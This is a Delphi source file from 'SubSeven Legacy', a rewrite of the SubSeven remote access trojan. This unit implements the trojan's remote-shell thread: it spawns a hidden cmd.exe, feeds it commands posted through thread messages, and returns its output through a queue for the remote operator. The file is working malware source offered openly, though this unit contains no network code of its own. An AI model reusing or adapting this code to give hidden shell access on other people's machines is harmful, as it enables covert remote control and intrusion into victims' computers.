{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Core.Shell.Thread.Instance;

interface

uses System.Classes, Winapi.Windows, Sub7.Core.Shell.Event, Generics.Collections,
     Winapi.Messages, Sub7.Core.Windows.Process, Sub7.Core.Thread;

type
  TS7ShellProc = class(TCoreThread)
  private
    FGUID    : String;
    FQueue   : TThreadedQueue<TS7ShellEvent>;
    FProcess : TS7SpawnProcessHelper;
  protected
    {@M}
    procedure OnThreadExecute(); override;
  public
    {@C}
    constructor Create(const AGUID : String; AQueue : TThreadedQueue<TS7ShellEvent>);

    {@M}
    procedure TerminatedSet(); override;
    procedure PostShellCommand(ACommand : AnsiString);
    procedure PostBreak();
    procedure PostClose();
  end;

  const WM_SHELL_COMMAND = WM_USER + 2802   + 1;
        WM_SHELL_CTRLC   = WM_SHELL_COMMAND + 1;
        WM_SHELL_CLOSE   = WM_SHELL_CTRLC   + 1;

implementation

uses System.SysUtils, Sub7.Core.Exceptions, Sub7.Core.Diagnostic;

{ TS7ShellProc.PostShellCommand }

procedure TS7ShellProc.PostShellCommand(ACommand : AnsiString);
var pCommand : PAnsiChar;
    ASize    : Cardinal;
begin
  ACommand := ACommand + #13#10;

  ASize := (Length(ACommand) * SizeOf(AnsiChar));


  {
    Create a copy of our string
  }
  GetMem(pCommand, ASize);
  try
    Move(ACommand[1], pCommand^, ASize);

    {
      Post String to Thread
    }
    if not PostThreadMessage(
                              self.ThreadID,
                              WM_SHELL_COMMAND,
                              NativeUInt(pCommand),
                              ASize
    ) then
      raise ES7WindowsException.Create('PostThreadMessage');
  except
    on E : Exception do
      FreeMem(pCommand, ASize);
  end;
end;

{ TS7ShellProc.PostBreak }

procedure TS7ShellProc.PostBreak();
begin
  PostThreadMessage(self.ThreadID, WM_SHELL_CTRLC, 0, 0);
end;

{ TS7ShellProc.PostClose

  Tell running thread to close the attached process session }
procedure TS7ShellProc.PostClose();
begin
  PostThreadMessage(self.ThreadID, WM_SHELL_CLOSE, 0, 0);
end;

{ TS7ShellProc.OnThreadExecute }

procedure TS7ShellProc.OnThreadExecute();
var pBuffer     : PVOID;
    ABufferSize : Cardinal;
    AMessage    : tagMsg;

    procedure ReadStdout();
    begin
      if FProcess.ReadStdout(pBuffer, ABufferSize, True) then begin
        FQueue.PushItem(TS7ShellBufferChunk.Create(FGUID, pBuffer, ABufferSize));
      end;
    end;

begin
  try
    while not Terminated do begin
      if not Assigned(FProcess) then
        break;
      ///

      ReadStdout();

      if not FProcess.Active then begin
        ReadStdout();

        break;
      end;

      {
        Check for thread messages
      }
      if PeekMessage(AMessage, 0, 0, 0, PM_REMOVE) then begin
        case AMessage.message of
          {
            Write buffer to Stdin
          }
          WM_SHELL_COMMAND : begin
            FProcess.Write(Pointer(AMessage.wParam), AMessage.lParam);

            FreeMem(Pointer(AMessage.wParam), AMessage.lParam);
          end;

          {
            Send Break / CTRL+C
          }
          WM_SHELL_CTRLC : begin
            FProcess.BreakConsole();
          end;

          {
            Terminate Process
          }
          WM_SHELL_CLOSE : begin
            FProcess.CloseProcess();
          end;
        end;
      end;
    end;
  finally
    // Tell peer that shell session has ended
    FQueue.PushItem(TS7ShellSessionEnded.Create(FGUID));
  end;
end;

{ TS7ShellProc.Create }

constructor TS7ShellProc.Create(const AGUID : String; AQueue : TThreadedQueue<TS7ShellEvent>);
var ACommand : String;
begin
  inherited Create();
  ///

  self.Priority        := tpNormal;
  self.FreeOnTerminate := False;

  FQueue := AQueue;
  FGUID  := AGUID;

  ACommand := GetEnvironmentVariable('COMSPEC');
  if (GetLastError() = ERROR_ENVVAR_NOT_FOUND) then
    ACommand := 'cmd.exe';

  FProcess := TS7SpawnProcessHelper.Create(ACommand);

  FProcess.ShowWindow             := False;
  FProcess.AttachToCurrentProcess := True;
  FProcess.ControlIO              := True;

  FProcess.Spawn();
end;

{ TS7ShellProc.TerminatedSet }

procedure TS7ShellProc.TerminatedSet();
begin
  inherited TerminatedSet();
  ///

  if Assigned(FProcess) then
    FreeAndNil(FProcess);
end;

end.
